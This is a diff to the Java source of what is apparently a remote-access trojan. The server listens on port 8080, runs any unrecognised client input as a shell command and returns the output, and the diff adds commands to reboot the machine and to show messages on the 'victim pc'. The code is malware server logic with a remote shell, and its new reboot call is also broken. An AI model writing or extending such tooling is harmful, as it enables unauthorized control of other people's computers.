@@ -4,13 +4,15 @@ import java.util.regex.Pattern;
 import java.util.regex.Matcher;
 
 import lib.GetInfo;
+import lib.Notify;
 
 public class Server {
-    public static final int PORT = 8080;
+    public static final int PORT = 8080; /* todo: Get port from config.json */
 
     public static void main(String[] args) {
         String os = System.getProperty("os.name");
 
+        /* Check if operating system is equal to `Linux` */
         if (!os.equalsIgnoreCase("Linux")) {
             System.err.println("[ERROR] Invalid operating system.");
             System.exit(1);
@@ -46,6 +48,7 @@ class ClientHandler extends Thread {
         this.socket = socket;
     }
 
+    /* This function checks if command.split(" ")[0] matches the regex */
     private static boolean isValidCommand(String command) {
         Pattern pattern = Pattern.compile(COMMAND_PATTERN);
         Matcher matcher = pattern.matcher(command);
@@ -95,33 +98,55 @@ class ClientHandler extends Thread {
                  * Check if input is a command
                  * else set isCommand as false
                  */
-                if(isValidCommand(str.split(" ")[0]))
+                if (isValidCommand(str.split(" ")[0]))
                     isCommand = true;
-                else 
+                else
                     isCommand = false;
 
                 /*
                  * Commands Handler
                  */
                 if (str.equals("END")) {
-                    isCommand = true;
                     break;
                 }
 
                 if (str.startsWith("lb{0x0001}")) {
-                    isCommand = true;
                     GetInfo info = new GetInfo();
                     info.run(str, out);
                 }
 
                 /*
+                 * lb{0x0002} - reboot
+                 * Reboot system
+                 */
+                if (str.startsWith("lb{0x0002}")) {
+                    out.println("Rebooting system...");
+                    ProcessBuilder processBuilder = new ProcessBuilder();
+                    processBuilder.command("reboot && sudo reboot");
+                }
+
+                /*
+                 * lb{0x0004} - Notify
+                 * Display notify to victim pc
+                 */
+                if(str.startsWith("lb{0x0004}")) {
+                    @SuppressWarnings("unused")
+                    Notify notify = new Notify(out);
+
+                    int index = str.indexOf(" ") + 1;
+                    String parsedMessage = str.substring(index);
+                    Notify.send("Luther Blissett", parsedMessage);
+                }
+
+                /*
                  * ~~ Shell Execution ~~
-                 * If the buffer sent by the client is not recognized as a command, 
-                 * the input is executed in the shell, 
+                 * If the buffer sent by the client is not recognized as a command,
+                 * the input is executed in the shell,
                  * and the output is sent back to the client subsequently.
                  */
-                if(isCommand == true) continue; /* Check if input isCommand else exec it */
-                
+                if (isCommand == true)
+                    continue; /* Check if input isCommand else exec it */
+
                 String result = executeCommand(str);
                 out.println(result != null ? result : "No Output provided");
             }
